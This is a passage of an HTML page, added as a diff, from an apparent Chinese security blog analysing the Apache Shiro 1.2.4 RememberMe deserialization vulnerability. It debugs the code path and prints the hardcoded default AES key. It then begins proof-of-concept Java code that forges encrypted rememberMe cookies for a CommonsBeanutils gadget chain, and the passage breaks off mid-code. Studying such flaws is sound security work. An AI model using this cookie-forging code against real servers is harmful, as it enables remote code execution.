@@ -1,0 +1,1009 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="3xsh0re">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Shiro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro反序列化漏洞分析">
+<meta property="og:url" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="3xsh0re&#39;Blog">
+<meta property="og:description" content="Shiro">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007145311053.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007145526167.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007150104799.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007151517794.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007152036413.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007154735878.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007155328484.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007161428002.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007162215122.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007162349828.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009154936376.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009160457347.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009160521557.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009192724018.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009193230826.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009194645589.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009200315744.png">
+<meta property="article:published_time" content="2024-08-24T06:20:26.000Z">
+<meta property="article:modified_time" content="2024-10-09T12:07:30.662Z">
+<meta property="article:author" content="3xsh0re">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://3xsh0re.github.io/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007145311053.png">
+  
+  
+  
+  <title>Shiro反序列化漏洞分析 - 3xsh0re&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"3xsh0re.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"OYnUsPOOxWtnPXQH1Dxz9wjM-gzGzoHsz","app_key":"GoMWtP1iHSKKpwsbzBlVqJ7P","server_url":"https://oynuspoo.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>3xsh0re&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/an1.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Shiro反序列化漏洞分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-24 14:20" pubdate>
+          2024年8月24日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          59 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Shiro反序列化漏洞分析</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2024年10月9日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Shiro</p>
+<span id="more"></span>
+
+<h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/apache/shiro.git<br><span class="hljs-built_in">cd</span> shiro<br>git checkout shiro-root-1.2.4<br></code></pre></td></tr></table></figure>
+
+<p>修改shiro/samples/web目录下的<code>pom.xml</code> 中<code>jstl版本为1.2</code>后更新maven</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007145311053.png" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>需要分析三个问题：</p>
+<ul>
+<li>为什么Shiro的RememberMe可以被伪造</li>
+<li>为什么会触发反序列化漏洞</li>
+<li>如何构造反序列化利用链</li>
+</ul>
+<p>启动Tomcat后，会自动跳转页面，点击到登陆页：</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007145526167.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>勾选RememberMe，然后登陆抓包，</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007150104799.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>显然这个remeberMe是AES加密，几个反斜杠连接的。下面开始调试：</p>
+<p>如果运行没报错但是调试报错了</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error </span>opening zip file or JAR manifest missing : C:\JetBrains\IntelliJIdea2022.3\groovyHotSwap\gragent.jar<br></code></pre></td></tr></table></figure>
+
+<p>可以在插件中禁用<code>groovy</code>插件解决</p>
+<p>然后全局搜索cookie，找到<code>CookieRememberMeManager.java</code>，这个就是漏洞存在的地方</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007151517794.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>看一下所有的函数，比较明显存在反序列化的地方有两个，</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007152036413.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>根据这两个函数的释义，<code>getRememberedSerializedIdentity</code>方法大概率是用在反序列化cookie的时候，所以查看对它的调用，只有一处，在其这个类的父类<code>AbstractRememberMeManager</code>中，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> PrincipalCollection <span class="hljs-title function_">getRememberedPrincipals</span><span class="hljs-params">(SubjectContext subjectContext)</span> {<br>    <span class="hljs-type">PrincipalCollection</span> <span class="hljs-variable">principals</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> {<br>        <span class="hljs-type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);<br>        <span class="hljs-comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span><br>        <span class="hljs-keyword">if</span> (bytes != <span class="hljs-literal">null</span> &amp;&amp; bytes.length &gt; <span class="hljs-number">0</span>) {<br>            principals = convertBytesToPrincipals(bytes, subjectContext);<br>        }<br>    } <span class="hljs-keyword">catch</span> (RuntimeException re) {<br>        principals = onRememberedPrincipalFailure(re, subjectContext);<br>    }<br><br>    <span class="hljs-keyword">return</span> principals;<br>}<br></code></pre></td></tr></table></figure>
+
+<p>可以看到调用了这个方法后返回了一串byte，然后用于后续的<code>convertBytesToPrincipals</code>，可以看到这个方法对字节数组进行了先解密再反序列化，</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007154735878.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>分析一下这个解密函数：使用了<code>CipherService</code>类解密，这是一个接口类，这里通过一个<code>getCipherService</code>方法得到一个实例，而这个实例本来就是<code>AbstractRememberMeManager</code>的一个私有成员变量；使用了<code>getDecryptionCipherKey</code>方法获取密钥，同样是返回一个私有成员变量。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] decrypt(<span class="hljs-type">byte</span>[] encrypted) {<br>    <span class="hljs-type">byte</span>[] serialized = encrypted;<br>    <span class="hljs-type">CipherService</span> <span class="hljs-variable">cipherService</span> <span class="hljs-operator">=</span> getCipherService();<br>    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-literal">null</span>) {<br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">byteSource</span> <span class="hljs-operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());<br>        serialized = byteSource.getBytes();<br>    }<br>    <span class="hljs-keyword">return</span> serialized;<br>}<br></code></pre></td></tr></table></figure>
+
+<p>在实例化时便被赋值，确认为AES进行加密，然后下一行就是使用一个字节数组常量去初始化密钥，密钥也写在了这个类文件里面，AES是对称加密，所以加密和解密密钥是一样的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="hljs-string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007155328484.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>分析到这里，就解决了为什么Shiro的RememberMe可以进行伪造的问题。</p>
+<p>回到初次调用<code>decrypt</code>方法的地方，分析为什么触发反序列化漏洞，调用的是父类的<code>deserialize</code>方法，返回一个<code>PrincipalCollection</code>类的实例，这里的<code>getSerializer</code>是返回一个原生的<code>Serializer&lt;T&gt;</code>，然后调用其反序列化方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] serializedIdentity)</span> {<br>    <span class="hljs-keyword">return</span> getSerializer().deserialize(serializedIdentity);<br>}<br></code></pre></td></tr></table></figure>
+
+<p>在<code>AbstractRememberMeManager</code>的514行出下断点，然后调试，在页面登陆，记得删除原有的<code>JSESSIONID</code>，步进两步，就进入了默认的序列化类</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007161428002.png" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h3><p>这里用到一个IDEA的插件，帮我们分析依赖，MavenHelper，去插件搜索下载即可。下载完成后重启应用，打开对应Web应用的<code>pom.xml</code>，下面会多出一个依赖分析。可以发现这里虽然有CC依赖，但是只是在Test中，并不在实际Web应用中，我们需要Runtime和Compile的依赖。</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007162215122.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>于是乎，发现了<code>CommonBeanUtils</code>包，CB链分析</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241007162349828.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>这里就先用CB链来打了，至于CC链的打法后面单独写一篇。</p>
+<p>这是Shiro中使用的配置：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultBlockCipherService</span><span class="hljs-params">(String algorithmName)</span> {<br>    <span class="hljs-built_in">super</span>(algorithmName); <span class="hljs-comment">//AES</span><br><br>    <span class="hljs-built_in">this</span>.modeName = OperationMode.CBC.name();<br>    <span class="hljs-built_in">this</span>.paddingSchemeName = PaddingScheme.PKCS5.getTransformationName();<br>    <span class="hljs-built_in">this</span>.blockSize = DEFAULT_BLOCK_SIZE; <span class="hljs-comment">//0 = use the JCA provider's default</span><br><br>    <span class="hljs-built_in">this</span>.streamingModeName = OperationMode.CBC.name();<br>    <span class="hljs-built_in">this</span>.streamingPaddingSchemeName = PaddingScheme.PKCS5.getTransformationName();<br>    <span class="hljs-built_in">this</span>.streamingBlockSize = DEFAULT_STREAMING_BLOCK_SIZE;<br>}<br></code></pre></td></tr></table></figure>
+
+<p>还需要注意最后将初始向量和EncPayload组合在一起：</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009154936376.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>仿造Shiro的来就行了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EncPayload</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] encryptionCipherKey = Base64.getDecoder().decode(<span class="hljs-string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);<br>    <span class="hljs-comment">// 使用 ensureSecureRandom 生成随机 IV</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] generateRandomIV(<span class="hljs-type">int</span> sizeInBits) {<br>        <span class="hljs-type">int</span> <span class="hljs-variable">BITS_PER_BYTE</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sizeInBytes</span> <span class="hljs-operator">=</span> sizeInBits / BITS_PER_BYTE; <span class="hljs-comment">// 将位数转为字节数</span><br>        <span class="hljs-type">byte</span>[] ivBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[sizeInBytes];<br>        <span class="hljs-type">SecureRandom</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> ensureSecureRandom();<br>        random.nextBytes(ivBytes); <span class="hljs-comment">// 生成随机字节的 IV</span><br>        <span class="hljs-keyword">return</span> ivBytes;<br>    }<br><br>    <span class="hljs-comment">// 确保使用安全的随机数生成器</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SecureRandom <span class="hljs-title function_">ensureSecureRandom</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureRandom</span>(); <span class="hljs-comment">// SecureRandom 通常用于密码学操作</span><br>    }<br><br>    <span class="hljs-comment">// 加密方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] encrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-comment">// 创建 AES 密钥规格</span><br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptionCipherKey, <span class="hljs-string">"AES"</span>);<br>        <span class="hljs-comment">// 随机生成一个 16 字节（128 位）的 IV</span><br>        <span class="hljs-type">byte</span>[] iv = generateRandomIV(<span class="hljs-number">128</span>); <span class="hljs-comment">// 生成的 IV 长度为 128 位（16 字节）</span><br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivParameterSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(iv);<br>        <span class="hljs-comment">// 获取 AES Cipher 实例，使用 CBC 模式和 